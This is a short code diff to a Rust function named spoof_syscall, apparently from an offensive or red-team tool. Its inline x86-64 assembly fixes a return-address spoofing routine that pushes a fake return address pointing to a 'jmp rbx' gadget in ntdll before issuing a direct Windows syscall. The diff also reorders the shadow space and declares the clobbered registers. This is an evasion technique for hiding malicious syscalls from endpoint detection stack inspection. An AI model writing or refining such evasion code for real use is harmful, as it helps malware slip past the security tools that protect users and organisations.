@@ -242,9 +242,10 @@ pub unsafe fn spoof_syscall(
         "jnz 2b",
 
         "3:",
+        "sub rsp, 0x20",      // Shadow space (32 bytes)
         "lea rbx, [rip + 4f]", // Real return address
-        "push {jmp_rbx}",     // Fake return address (points to jmp rbx in ntdll)
-        "sub rsp, 0x20",      // Shadow space
+        "push {jmp_rbx}",     // Fake return address (points to jmp rbx in ntdll).
+                             // Now [RSP] = jmp_rbx, [RSP+8..0x27] = shadow, [RSP+0x28] = arg5
 
         "mov r10, {arg1}",
         "mov rdx, {arg2}",
@@ -270,6 +271,8 @@ pub unsafe fn spoof_syscall(
         arg3 = in(reg) stack_args[2],
         arg4 = in(reg) stack_args[3],
         lateout("rax") result,
+        out("rcx") _,
+        out("r11") _,
     );
 
     result
